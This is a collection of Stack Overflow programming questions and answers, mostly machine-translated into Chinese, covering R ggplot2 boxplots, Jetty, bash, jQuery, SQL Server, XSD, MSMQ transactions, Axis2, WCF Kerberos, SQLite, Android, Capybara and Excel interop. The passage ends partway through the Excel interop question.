> 时间：2012-09-14T15:21:05.993
> 
> 标签：r, ggplot2, boxplot

I have data in the following format:

```
 # repetition, packet, route, energy level
  1, 1, 1, 10.0
  1, 1, 2, 12.3
  1, 1, 3, 13.8
  1, 2, 1, 9.2
  1, 2, 2, 10.1
  1, 2, 3, 11.2
  ...
  50,99,3, 0.01 
```

Now, I want to create a plot showing box plots per route per packet over all repetitions. So, for example the x-axis would depict the packets and the y-axis the energy level. The first tick on the x-axis would show three box plots which contain data of three subsets

```
 subset(data, data$packet == 1 & data$route == 1)
  subset(data, data$packet == 1 & data$route == 2)
  subset(data, data$packet == 1 & data$route == 3) 
```

and so on. I'm using ggplot2 and I'm wondering if I have to create each time a boxplot and try to add them into one or if there is a smart way to do this?

Thanks in advance! M.

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-14T16:18:42.383

如果您正在使用`ggplot2`，您将能够很好地做到这一点`facet_wrap`，它可以创建多个彼此相邻的箱线图。例如：

```
library(ggplot2)
mydata = data.frame(x=as.factor(rep(1:2, 5, each=5)), y=rnorm(50),
        division=rep(letters[1:5], each=10))

print(ggplot(mydata, aes(x, y)) + geom_boxplot() + facet_wrap(~division)) 
```

![在此处输入图像描述](../Images/4ea9059e3b66306078a00a616d50b25c.png)

就您的代码而言，您看起来实际上可能想要除以两个变量（这有点不清楚）。如果您想按路由然后按数据包划分它（正如您的示例似乎暗示的那样），您可以使用`facet_grid`：

```
print(ggplot(data, aes(repetition, energy.level)) + geom_boxplot() + facet_grid(route ~ packet)) 
```

但是，请注意，由于您有 99 个数据包，因此最终将有*99 个图形宽*，因此您可能想尝试不同的方法。

# java - jetty dependencies (classes) not found on server start

> ID：12427889
> 
> 赞同：1
> 
> 时间：2012-09-14T15:47:47.063
> 
> 标签：java, jsp, jetty

I have a WTP project in eclipse and deploy it as a WAR file in jetty 8.1.5\. In the `/WEB-INF/lib` directory there are some dependencies (jars) required for the web application. When I deploy the WAR and start the server I get lots of exceptions about classes which are not found. These classes are available in the jetty jars in `/jetty-home/lib` If I put these jetty jars in `/WEB-INF/lib` of the web app, it works fine although as I understand it should not be done that way. what could be the reason??

This is a sample of the exceptions' trace:

```
java.lang.NoClassDefFoundError: org/eclipse/jetty/util/component/AbstractLifeCycle
    at java.lang.ClassLoader.defineClass1(Native Method)
    at java.lang.ClassLoader.defineClass(Unknown Source)
    at java.security.SecureClassLoader.defineClass(Unknown Source)
    at java.net.URLClassLoader.defineClass(Unknown Source)
    at java.net.URLClassLoader.access$100(Unknown Source)
    at java.net.URLClassLoader$1.run(Unknown Source)
    at java.net.URLClassLoader$1.run(Unknown Source)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(Unknown Source)
    at org.eclipse.jetty.webapp.WebAppClassLoader.loadClass(WebAppClassLoader.java:415)
    at org.eclipse.jetty.webapp.WebAppClassLoader.loadClass(WebAppClassLoader.java:377)
    at java.lang.Class.getDeclaredMethods0(Native Method)
    at java.lang.Class.privateGetDeclaredMethods(Unknown Source)
    at java.lang.Class.getDeclaredMethods(Unknown Source)
    at org.eclipse.jetty.annotations.ResourceAnnotationHandler.doHandle(ResourceAnnotationHandler.java:58)
    at org.eclipse.jetty.annotations.AnnotationIntrospector$AbstractIntrospectableAnnotationHandler.handle(AnnotationIntrospector.java:66)
    at org.eclipse.jetty.annotations.AnnotationIntrospector.introspect(AnnotationIntrospector.java:91)
    at org.eclipse.jetty.annotations.AnnotationDecorator.introspect(AnnotationDecorator.java:158)
    at org.eclipse.jetty.annotations.AnnotationDecorator.decorateServletInstance(AnnotationDecorator.java:110)
    at org.eclipse.jetty.servlet.ServletContextHandler$Context.createServlet(ServletContextHandler.java:1063)
    at org.eclipse.jetty.servlet.ServletHolder.newInstance(ServletHolder.java:916)
    at org.eclipse.jetty.servlet.ServletHolder.initServlet(ServletHolder.java:496)
    at org.eclipse.jetty.servlet.ServletHolder.doStart(ServletHolder.java:326)
    at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:59)
    at org.eclipse.jetty.servlet.ServletHandler.initialize(ServletHandler.java:742)
    at org.eclipse.jetty.servlet.ServletContextHandler.startContext(ServletContextHandler.java:258)
    at org.eclipse.jetty.webapp.WebAppContext.startContext(WebAppContext.java:1233)
    at org.eclipse.jetty.server.handler.ContextHandler.doStart(ContextHandler.java:701)
    at org.eclipse.jetty.webapp.WebAppContext.doStart(WebAppContext.java:475)
    at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:59)
    at org.eclipse.jetty.deploy.bindings.StandardStarter.processBinding(StandardStarter.java:36)
    at org.eclipse.jetty.deploy.AppLifeCycle.runBindings(AppLifeCycle.java:183)
    at org.eclipse.jetty.deploy.DeploymentManager.requestAppGoal(DeploymentManager.java:491)
    at org.eclipse.jetty.deploy.DeploymentManager.addApp(DeploymentManager.java:138)
    at org.eclipse.jetty.deploy.providers.ScanningAppProvider.fileAdded(ScanningAppProvider.java:142)
    at org.eclipse.jetty.deploy.providers.ScanningAppProvider$1.fileAdded(ScanningAppProvider.java:53)
    at org.eclipse.jetty.util.Scanner.reportAddition(Scanner.java:604)
    at org.eclipse.jetty.util.Scanner.reportDifferences(Scanner.java:535)
    at org.eclipse.jetty.util.Scanner.scan(Scanner.java:398)
    at org.eclipse.jetty.util.Scanner.doStart(Scanner.java:332)
    at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:59)
    at org.eclipse.jetty.deploy.providers.ScanningAppProvider.doStart(ScanningAppProvider.java:118)
    at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:59)
    at org.eclipse.jetty.deploy.DeploymentManager.startAppProvider(DeploymentManager.java:552)
    at org.eclipse.jetty.deploy.DeploymentManager.doStart(DeploymentManager.java:227)
    at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:59)
    at org.eclipse.jetty.util.component.AggregateLifeCycle.doStart(AggregateLifeCycle.java:75)
    at org.eclipse.jetty.server.handler.AbstractHandler.doStart(AbstractHandler.java:53)
    at org.eclipse.jetty.server.handler.HandlerWrapper.doStart(HandlerWrapper.java:91)
    at org.eclipse.jetty.server.Server.doStart(Server.java:272)
    at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:59)
    at org.eclipse.jetty.xml.XmlConfiguration$1.run(XmlConfiguration.java:1260)
    at java.security.AccessController.doPrivileged(Native Method)
    at org.eclipse.jetty.xml.XmlConfiguration.main(XmlConfiguration.java:1183)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
    at java.lang.reflect.Method.invoke(Unknown Source)
    at org.eclipse.jetty.start.Main.invokeMain(Main.java:462)
    at org.eclipse.jetty.start.Main.start(Main.java:610)
    at org.eclipse.jetty.start.Main.main(Main.java:86) 
```

When I deploy my web app into another machine (server), I get the following exception:

```
org.apache.jasper.el.ELContextImpl cannot be cast to org.apache.jasper.runtime.ElContextImpl 
```

and I think it might be related to the jetty jars that I added to `/WEB-INF/lib`.

# visual-studio-2010 - Show TODO tasks only for pending changes in Visual Studio

> ID：12427890
> 
> 赞同：7
> 
> 时间：2012-09-14T15:47:52.333
> 
> 标签：visual-studio-2010, todo

The Task List in Visual Studio 2010 will show all the TODO comments in a solution, but is there some way to filter it to only show TODOs for files with pending changes or for files that are open? In other words, I don't want to see everyone else's TODOs, only the TODOs in my changeset. If it isn't built in, is there a plug-in that you like that can do that?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-07T12:33:57.730

**任务列表**窗口列出了所有包含**TODO**关键字的注释。还有两个默认关键字；**破解**和**撤消**。VS 不允许更改或删除**TODO**关键字，但允许添加新关键字。如果您将特殊关键字（如**RoToDo**）添加到**令牌列表**（位于**Tools/Options/Enviroment/Task List 中**）并在您的评论中使用此关键字，如“// ***RoToDo*** *comment here* ”，任务列表窗口也会显示这些评论. 最后; 您可以使用任务列表窗口的排序属性来收集您的特殊评论。

> ***RoToDo**在这里评论 1*
> ***RoToDo****在这里评论 2 RoToDo 在*
> ***这里****评论 3*
> ***RoToDo****在这里评论 4*
> ***待办事项 :****在这里评论 1*
> ***待办事项 :****在这里评论 2*
> ***待办事项 :****在这里评论 3*

# linux - 在 bash 别名 $argv 中自动转义 IP 地址

> ID：12427892
> 
> 赞同：0
> 
> 时间：2012-09-14T15:48:04.020
> 
> 标签：linux, sed, bash

我想设置一个 bash 别名来自动 grep 目录中的所有日志；但是，为了使这个用户友好，我需要转义句点并添加一个空白边界，这样 grep 就不会匹配太多行。

首先，我检查以确保我有正确的语法来转义地址......

```
[mpenning@sasmars daily]$ echo 1.1.1.1 | sed "s/\./\\\\./g"
1\.1\.1\.1
[mpenning@sasmars daily]$ 
```

接下来我试图逃避一个 CLI 参数......但它并没有让我到达那里......

```
[mpenning@sasmars daily]$ alias tryme='echo `sed "s/$argv[1]/\\\\./g"`'
[mpenning@sasmars daily]$ tryme 1.1.1.1 
```

-> 无限期挂起，直到我击中`cntl``c`

我意识到 echo 不会搜索，但这是一个简单的测试。

在 bash 别名的参数中转义句点的最简单方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T15:58:32.807

你想要的是一个函数，你可以使用 bash 的内置替换语法：

```
$ function tryme() { echo "${1//./\.}"; }
$ tryme 1.1.1.1
1\.1\.1\.1
$ tryme "also. with ... spaces"
also\. with \.\.\. spaces 
```

这将避免你分叉一个`sed`进程。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:59:56.517

根据[*Bash 参考手册*](http://www.gnu.org/software/bash/manual/bashref.html#Aliases)[的第 6.6 节“别名”](http://www.gnu.org/software/bash/manual/bashref.html#Aliases)*：*

 *> 没有在替换文本中使用参数的机制，如`csh`. 如果需要参数，则应使用外壳函数（请参阅[外壳函数](http://www.gnu.org/software/bash/manual/bashref.html#Shell-Functions)）。

此外，`sed "s/$argv[1]/\\\\./g"`如果它将参数放在 sed 模式而不是输入字符串中，那么无论如何也没有任何意义。

所以，你会写：

```
function tryme() {
    echo "$(echo "$1" | sed "s/\./\\\\./g")"
} 
```

或者，`<<<`用于传入输入：

```
function tryme() {
    echo "$(sed "s/\./\\\\./g" <<<"$1")"
} 
```*

# javascript - jQuery Plugin - 从插件中调用公共方法

> ID：12427894
> 
> 赞同：0
> 
> 时间：2012-09-14T15:48:15.213
> 
> 标签：javascript, jquery, jquery-plugins

我很难从插件本身调用公共方法。我不确定问题是什么。我究竟做错了什么？

```
(function($) {

    var MyPlugin = function(){

        /* PUBLIC */
        this.publicFunction = function() {
            // Do public things
        };

        /* PRIVATE */
        var privateFunction = function() {
            // Do private things

            // Call this one public function
            publicFunction(); // WANT THIS but doesn't work
        }
    };

    $.fn.myPlugin = function() {

        var myPlugin = new MyPlugin(options);

        // Binding click to public function
        $("a").bind('click', function(e){
            e.preventDefault();
            myPlugin.publicFunction($(this)); // AND WANT THIS but does
        });

        return myPlugin;
    };
})(jQuery); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:51:44.480

您只需要能够`this`从函数本身中引用 MyPlugin 的对象而不会丢失范围。为此，将其分配给一个变量（名称无关紧要，典型的约定是`self`）

```
var MyPlugin = function(){
    var self = this;
    ...
    var privatefunction = function () {
        self.publicFunction();
    }
... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:51:34.330

在您的 MyPlugin 函数中缓存对 MyPlugin 实例的引用：

```
var self = this; 
```

然后在 privateFunction 内部调用 publicFunction 作为 self 的成员：

```
self.publicFunction(); 
```

问题是您已将 publicFunction 定义为 MyPlugin 实例的成员，而不是全局（这很好），但是您从不同的范围调用它，并且由于 publicFunction 不是全局的，因此您需要告诉 javascript 在哪里找到它。您不能使用`this`，因为在您调用它的上下文中，`this`不会指向 MyPlugin 实例

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T16:06:28.817

```
(function($) {

    var MyPlugin = function(options){

        /* PRIVATE - one copy for each instance */
        var options = $.extend({},options),
            privateFunction = function() {
                // Do private things
                // ...
                // Call this one public function
                this.publicFunction();
            };
    };

    // Shared by all MyPlugin instances;
    MyPlugin.prototype.publicFunction = function($element) {
            // Do public things
    };

    $.fn.myPlugin = function() {

        var myPlugin = new MyPlugin(options);

        // Binding click to public function
        $("a").bind('click', function(e){
            e.preventDefault();
            myPlugin.publicFunction($(this));
        });

        return myPlugin;
    };
})(jQuery); 
```

# sql - 如果存在则查询一个表，否则不

> ID：12427895
> 
> 赞同：0
> 
> 时间：2012-09-14T15:48:16.170
> 
> 标签：sql, sql-server, sql-server-2005

我正在使用 SQL 2005，并具有以下代码：

```
DECLARE @exist4 INT
IF ( SELECT COUNT(*) existe
     FROM   sysobjects obj
     WHERE  obj.name = 'table4'
   ) > 0 
    BEGIN 
        SET @exist4 = 1
    END
ELSE 
    BEGIN 
        SET @exist4 = 0
    END

/*now if table4 exist i need add to my query but if i do something as it
i got next error
Invalid object name 'table4'.*/

IF ( @exist4 = 0 ) 
    BEGIN

        SELECT  [table].col1 ,
                [table].col2 ,
                [table].col3 ,
                [table].colN
        FROM    [table] ,
                table2 ,
                table3
        WHERE   [table].id = table1.id
                AND table3.id = table2.id
    END
ELSE 
    BEGIN
        SELECT  [table].col1 ,
                [table].col2 ,
                [table].col3 ,
                [table].colN
        FROM    [table] ,
                table2 ,
                table3 ,
                table4
        WHERE   [table].id = table2.id
                AND table3.id = table2.id
                AND table4.id = table3.id
    END 
```

当 Table4 不存在时，此代码返回错误。我怎样才能让这个查询工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:55:55.590

发生的事情是在解析查询时 table4 不存在。这意味着您无法运行查询。

您需要做的是延迟解析该部分查询，直到您知道 table4 存在。

您可以通过将查询放在一个字符串中然后运行存储过程 sp_excutesql 来做到这一点。像这样的东西：

```
 DECLARE @myQueryString NVARCHAR(4000);
 SET @myQueryString = N'select table.col1, table.col2, table.col3, table.colN into #tmp
     from table,table2,table3,table4
     where table.id=table2.table1id 
     and table3.table2id=table2.id
     and table4.table3id=table3id';
 EXEC sp_executesql @myQueryString; 
```

引用 table4 的查询部分仅在第一次解析整个查询时作为字符串可用，因此解析器只看到一个字符串，而不是对各个表的引用。当您运行 sp_executesql 时，字符串会被解析并运行。因为你把它放在你的 IF 块中，它只会在它知道 table4 存在时解析和运行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T16:01:52.110

优化器可能正在尝试评估 select 语句语法，因此将其包装在 sp_executesql 语句中以延迟该语法。尝试：

```
 IF ( SELECT OBJECT_ID('SQLInstances')
   ) IS NOT NULL 
    BEGIN 
        EXEC sp_executesql @statement = N'select table1.col1, table1.col2, table1.col3, table1.colN into #tmp from table1,table2,table3
where table1.id=table2.table1id 
and table3.table2id=table2.id'
    END
ELSE 
    BEGIN 
        EXEC sp_executesql @statement = N'select table1.col1, table1.col2, table1.col3, table1.colN into #tmp from table1,table2,table3,table4
where table1.id=table2.table1id 
and table3.table2id=table2.id
and table4.table3id=table3id'
    END 
```

# xsd - 带有属性的 simpleContent 类型字符串的 XSD 定义

> ID：12427896
> 
> 赞同：0
> 
> 时间：2012-09-14T15:48:16.657
> 
> 标签：xsd, definition

我想将 XSD 定义为：

`<Group id="someid" parent="someid">some string</Group>`

这是我尝试过的：

```
<xs:element name="Group" minOccurs="0" maxOccurs="unbounded">
    <xs:complexType>
        <xs:simpleContent>
            <xs:restriction base="xs:string">
                  <xs:attribute name="id" type="xs:ID" use="required"/>
                  <xs:attribute name="parent" type="xs:IDREF" use="optional"/>
            </xs:restriction>
        </xs:simpleContent>
    </xs:complexType>
</xs:element> 
```

我使用 Visual Studio 进行 XSD 设计。验证器告诉我（在“<xs:restriction”下划线时）：“未定义的 complexType 'http://w3.org/2001/XMLSchema:string' 被用作复杂类型限制的基础。”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T16:03:45.183

它需要使用`<xs:extension>`而不是`<xs:restriction>`：

```
<xs:element name="Group" minOccurs="0" maxOccurs="unbounded">
    <xs:complexType>
        <xs:simpleContent>
            <xs:extension base="xs:string">
                  <xs:attribute name="id" type="xs:ID" use="required"/>
                  <xs:attribute name="parent" type="xs:IDREF" use="optional"/>
            </xs:extension>
        </xs:simpleContent>
    </xs:complexType>
</xs:element> 
```

# .net - 在队列之间发送时，TransactionScope 提升到 MSDTC？

> ID：12427898
> 
> 赞同：5
> 
> 时间：2012-09-14T15:48:23.817
> 
> 标签：.net, sql-server, transactions, msmq, transactionscope

我有一个简单的过程，它从一个队列中读取，处理消息，然后输出到另一个队列。我试图将此传输包装在 TransactionScope 中，以便从输入队列读取和写入输出队列都发生在同一个事务中。

但是，似乎正在使用 MSDTC 来执行此事务，因此它比使用标准 MessageQueueTransaction 慢得多。这应该发生吗？我的印象是 TransactionScope 只有在涉及范围时才会提升为外部事务，例如，读取消息队列和写入数据库，但如果只涉及多个消息队列则不会。

谢谢。

编辑：目前这一切都在我的笔记本电脑上，所以我确信不涉及其他机器。

我还想补充一点，我通过签入 Windows 的“组件服务”管理单元（即本地 DTC/事务列表）来确认正在发生升级的事务。我可以看到进入和离开这个屏幕的交易，我认为这意味着交易已经升级。我假设这个错了吗？

编辑2：当我只写一个队列时，我得到了同样的行为！IE

```
using (var ts = new TransactionScope())
{
    using (var q = new MessageQueue("..."))
    {
        /* write data */
    }

    ts.Complete();
} 
```

尽管队列在本地计算机上，但我可以看到 DTC 与上述一起使用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-18T13:38:16.033

似乎 TransactionScope 只处理与消息队列有关的外部事务。如果您希望它仅是内部的，则必须使用 MessageQueueTransaction。这与仅在需要时才升级事务的 SQL 事务不同，这让我感到困惑。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-15T16:15:42.990

看看这篇 MSDN 文章：[事务管理升级](http://msdn.microsoft.com/en-us/library/ms229978%28v=VS.85%29.aspx)

此列表典型的升级行为，例如（重点是我的）：

> 当您想将事务提供给**同一台计算机上****另一个应用程序域中**的另一个对象（包括**跨**进程和**机器边界**）时，System.Transactions 基础结构会自动升级事务以由 Microsoft 分布式事务协调器 (MSDTC) 管理。如果您征用**另一个持久资源管理器**，也会发生升级。升级后，事务将在其升级状态下保持受管理状态，直到完成。

 ****如您所见，提升不仅可以在您通过网络执行操作时发生，即使您在同一台计算机上执行操作也是如此。（例如，我最近在同一（集群）服务器上从 Windows 服务访问 MS SQL 数据库时遇到了麻烦。）

如果 WCF 服务在流程中的某处涉及，也可能发生这种情况。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-06-04T12:56:36.947

> *似乎 TransactionScope 只处理与消息队列有关的外部事务。*

这种说法是不正确的。TransactionScope 将处理消息队列中的本地事务，只是它使用 MSDTC 来执行此操作。****

# java - org.apache.axis2.AxisFault：尚未设置传输输出

> ID：12427900
> 
> 赞同：0
> 
> 时间：2012-09-14T15:48:35.170
> 
> 标签：java, web-services, axis2, webservice-client

我对 Axis2 的 WS 有一个大问题

**用例（本地主机服务器，没有互联网访问[在代理下]）**：

我创建了一个小的本地 Web 服务和一个调用该服务的客户端.... 端点类似于“http://localhost:8080/MyService”

没关系：客户端请求和服务器响应！

我是 bas***d，我想测试我的客户端，所以我在“http://localhost:8082/MyService”中更改了端点（端口已更改）

没关系：客户端请求...并且超时...没有服务响应 8082

测试继续：我在 Internet 上有相同的 Web 服务，所以我在“http://wsdomain:8080/MyService”中更改了我的端点客户端......而不触及代理 conf（在 client.axis2.xml 上）

客户请求....我收到一个异常：

`org.apache.axis2.AxisFault: Transport out has not been set`

所以，我在 client.axis.xml 中设置了代理...我已经替换了这个：

```
<transportSender name="http" class="org.apache.axis2.transport.http.CommonsHTTPTransportSender">
    <parameter name="PROTOCOL">HTTP/1.1</parameter>
    <parameter name="Transfer-Encoding">chunked</parameter>
</transportSender> 
```

有了这个：

```
<transportSender name="http" class="org.apache.axis2.transport.http.CommonsHTTPTransportSender">
    <parameter name="Proxy">
        <Configuration>
            <ProxyHost>MyproxyIp</ProxyHost>
            <ProxyPort>MyproxyPort</ProxyPort>
        </Configuration>
    </parameter>
    <parameter name="PROTOCOL">HTTP/1.1</parameter>
    <parameter name="Transfer-Encoding">chunked</parameter>
</transportSender> 
```

但我的客户抛出了同样的异常： `org.apache.axis2.AxisFault: Transport out has not been set`

我想念什么？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-19T07:33:50.600

好的，我已经解决了这个问题......我认为问题出在代理配置中......但我的问题是 url 字符串中的空格......AAAARRGH......我认为这个异常太笼统了，它没有解释问题

# wcf - WCF 中的委派不起作用 - 第一跳是 NTLM？

> ID：12427902
> 
> 赞同：0
> 
> 时间：2012-09-14T15:48:46.307
> 
> 标签：wcf, active-directory, impersonation, kerberos, ntlm

我正在开发一个需要在双跳场景中进行委派的项目。我们有一个桌面客户端，使用 net.tcp 绑定连接到 WCF 服务，连接到另一台服务器上的 SQL 数据库。我们的目标是使用用户的凭据来访问 SQL 数据库。

WCF 服务和 SQL 数据库都在同一个域用户下运行，该用户为 SQL 数据库启用了委派。[已按照此处](http://msdn.microsoft.com/en-us/library/ff650896.aspx)的说明进行操作，但没有成功。

现在，我们的日志中记录了一些详细信息： SQL 数据库上使用的登录名显示为运行 WCF 服务的用户，并使用 Kerberos。WCF 服务器上使用的登录名显示为客户端用户，但使用的是 NTLM。使用`[OperationBehavior(Impersonation = ImpersonationOption.Allowed)]`或`using (ServiceSecurityContext.Current.WindowsIdentity.Impersonate())`导致命令在 WCF 服务器上作为客户端运行。这让我相信模拟工作正常。

那么，什么可能导致第一个跃点回退到 NTLM？我们怀疑这是 SPN 问题，但我们已将 WCF 服务和 SQL 服务的 SPN 注册到共享域用户。此外，按照上面列出的说明，我们已将 SQL 服务设置为受信任的域用户委派。

我们`EndpointIdentity.CreateSpnIdentity`在 WCF 服务上使用了设置 SPN，这就是我们向域用户注册的 SPN。

有什么建议么？提前致谢！

编辑：我们发现了一些可能存在问题的东西——我们没有`EndpointIdentity.CreateSpnIdentity`在客户端上使用过。设置后，我们收到错误“调用 SSPI 失败”，内部异常“目标原理名称不正确”。但是我们在客户端和服务端设置的 SPN 匹配，并且都匹配服务的主机名。如果我们将客户端和服务器 SPN 都设置为完全不同的值，或者如果客户端指定的 SPN 与服务器的 SPN 不匹配，则身份验证会像以前一样回退到 NTLM。我们已经对该错误进行了研究，但找不到其原因。有什么建议么？

我们还对这两种情况进行了数据包捕获——回退到 NTLM 以及当我们收到“调用 SSPI 失败”错误时。在这两种情况下，都会发送和接收类似的数据包，直到其中一个提到 NTLM。另一方面，“TURN CHANNEL”数据包从客户端发送到服务器。这些数据包不包含任何人类可读的内容，除了服务器的 IP 地址，直到提到 NTLM，发送用户名和计算机名称，或者发送“TURN CHANNEL”数据包，其中包含似乎是 SPN 的内容，可能还有主机名。似乎没有任何人类可读的错误代码或错误消息。关于在数据包中寻找什么有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T00:15:41.613

我们发现了我们的错误 - 客户端正在使用服务器的 IP 地址创建连接。将 IP 切换为完全限定域名后，第一跳始终使用 Kerberos 进行身份验证。

IP 地址解析为我们在两个 SPN 中使用的相同字符串，但我想客户端会在执行任何其他检查之前检查连接字符串是否与斜杠后面的 SPN 部分匹配。

我们使用网络服务和我们的域用户测试了我们的结果，只要 SPN 分别注册到计算机或用户，就没有问题。

希望这个答案可以为其他人节省一些时间和麻烦！

附加说明：虽然这为所有连接启用了 Kerberos 身份验证，但我们后来发现这在我们的情况下是不必要的。我们与数据库的部分连接不在模拟 using 块内，这导致表读取失败。此后，我们删除了所有委托和 SPN 相关代码，并且数据库连接继续正常工作。我们的第一跳是使用 NTLM。我们不确定在 SQL 服务器上是如何使用凭据的，因为我们的连接似乎正是所谓的双跳场景，这应该需要 Kerberos 和委派，但很难争论什么是有效的。我怀疑这可能与[本文档](http://msdn.microsoft.com/en-us/library/ms730088.aspx)中授权下的注释有关：

> 当客户端使用与后端服务上的 Windows 帐户对应的用户名和密码对前端服务进行身份验证时，前端服务可以通过重用客户端的用户名和密码对后端服务进行身份验证. 这是一种特别强大的身份流形式，因为将用户名和密码传递给后端服务可以使后端服务执行模拟，但由于未使用 Kerberos，因此不构成委托。Active Directory 对委派的控制不适用于用户名和密码身份验证。

如果有人对它的工作原因有任何其他建议，我很想听听他们的意见。但是，我觉得不值得再提出一个问题。

# android - 如何使用 SQLite DB 使其不会不必要地增长

> ID：12427904
> 
> 赞同：3
> 
> 时间：2012-09-14T15:48:50.820
> 
> 标签：android, sqlite

我有一项服务可以在应用程序的 SQLite DB 中创建记录、处理数据并从 SQLite DB 中删除记录。

我发现 SQLite 数据库随着时间的推移（可能是一周）而增长，尽管其中的记录数量保持相当稳定。

**问题** 在不增加数据库的情况下添加和删除记录的最佳做法是什么？

要插入我使用的记录： `result = mDB.insert(table, null, kvpairs);`

要删除我使用的记录： `result = mDB.delete(table, where, null);`

**参考**

[Android SQLiteDatabase 插入](http://developer.android.com/reference/android/database/sqlite/SQLiteDatabase.html#insert%28java.lang.String,%20java.lang.String,%20android.content.ContentValues%29)

[Android SQLiteDatabase 删除](http://developer.android.com/reference/android/database/sqlite/SQLiteDatabase.html#delete%28java.lang.String,%20java.lang.String,%20java.lang.String%5B%5D%29)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T16:42:51.133

数据库中的空闲页面将被重用，因此增长不会无限。

您可以尝试就地更新记录，但如果您无法将旧记录映射到新记录或某些值更改了它们的大小，这将无济于事。

尝试定期运行[VACUUM](http://www.sqlite.org/lang_vacuum.html)和/或启用[PRAGMA auto_vacuum](http://www.sqlite.org/pragma.html#pragma_auto_vacuum)。

# android - Android 片段在打开时处于活动状态

> ID：12427905
> 
> 赞同：1
> 
> 时间：2012-09-14T15:48:55.963
> 
> 标签：android, android-fragments

我正在使用`ViewPager`. 我有 3 个片段（A、B、C），其中两个（A 和 C）正在`ListView`从服务器填充，因此需要几秒钟的时间。我正在展示一个`ProgressDialog`. B 是设置为首先显示的片段，它没有任何后台进程，只有几个按钮。

所以问题是`ProgressDialog`总是会在创建该活动时显示，即所有片段总是被加载。

所以我想知道`Fragment`当我打开它（幻灯片）时是否可以只加载特定的（A或C），以便想要使用图标菜单（B片段）的用户不需要等待其他片段（A＆C ） 装载。我不确定它是否可能。谁能建议我任何代码片段或参考来实现它。对此的任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-24T09:53:27.270

没关系，我已经很容易做到了，`AsyncTask`并且`Fragments`在后台更新

# loops - 遍历 Capybara 中的项目

> ID：12427913
> 
> 赞同：16
> 
> 时间：2012-09-14T15:49:20.627
> 
> 标签：loops, iteration, capybara

我有一个包含多个.block 类元素的页面。在 Capybara 中，我希望能够在完成一个动作之前循环并引用这个类的每个元素。

但是，到目前为止，我尝试过的所有代码都没有奏效。这是我尝试过的：

```
within('.block:nth-child(1)') do
  find('.Button').click
end

page.find('.block').all.first.find('Button').click

page.find('.block').all[1].find('Button').click 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2012-09-15T19:23:51.157

您想使用该`all`方法（请参阅[http://rubydoc.info/github/jnicklas/capybara/Capybara/Node/Finders#all-instance_method](http://rubydoc.info/github/jnicklas/capybara/Capybara/Node/Finders#all-instance_method)）。

使用类 'block' 输出每个元素的文本（即迭代）的示例是：

```
page.all(:css, '.block').each do |el|
    puts el.text
end 
```

`page.all`返回匹配元素的数组。所以如果你只想要第二个匹配元素，你可以这样做：

```
page.all(:css, '.block')[1]  #Note that it is 0-based index 
```

# excel - 互操作 Excel 自动化 - 使用服务帐户打开工作簿

> ID：12427918
> 
> 赞同：2
> 
> 时间：2012-09-14T15:50:09.877
> 
> 标签：excel, interop

我在这里面临一种情况，希望得到一些反馈或建议。我得到了一个作为服务运行的应用程序，具有特定的服务帐户（不是服务器上的管理员），并尝试打开 Excel 工作簿。

问题不在于初始应用程序，因为我可以使用下面的通用 C# 代码（嵌入在服务结构中）重现它：

```
try{
    this._exApp = new Microsoft.Office.Interop.Excel.ApplicationClass();
    this._exApp.Visible = false;

    Log.Logger.Info("Opening workbook...");
    Workbook workbook = this._exApp.Workbooks.Open(
                thisFileName,
                Type.Missing,
                Type.Missing,
                Type.Missing,
                Type.Missing,
                Type.Missing,
                Type.Missing,
                Type.Missing,
                Type.Missing,
                Type.Missing,
                Type.Missing,
                Type.Missing,
                Type.Missing,
                Type.Missing
                );
    Log.Logger.Info("Workbook opened!");

    //Do something with the result
    Log.Logger.Info("Closing workbook...");
    workbook.Close(false, thisFileName, null);
    Marshal.ReleaseComObject(workbook);

    this._exApp.Quit();
}
catch(Exception ex){
    Log.Logger.Error(ex.Message);
} 
```

（关于 *this._exApp* 和*thisFileName*没有什么特别之处，它们只是分别转换为 Microsoft.Office.Interop.Excel.Application，并作为带有要打开的文件路径的字符串。Log.Logger 是一个记录器类，使用log4net 让我看到问题发生的时间）

该服务作为服务帐户运行，该帐户是服务器上的用户，而不是管理员。它可以访问目标文件和服务器上的文件（作为读取访问）。该服务器是 Windows Server 2003 Standard Edition SP2（无法在 2008 R2 服务器上试用）。

我面临的问题是它只是在尝试打开工作簿时挂起，所以在跟踪我的最后一行是“正在打开工作簿......”，从未到达“工作簿打开”行。没有引发异常。

所以代码很简单，只是想打开一个excel工作簿。我已经做了一些调查，以下是我的发现：

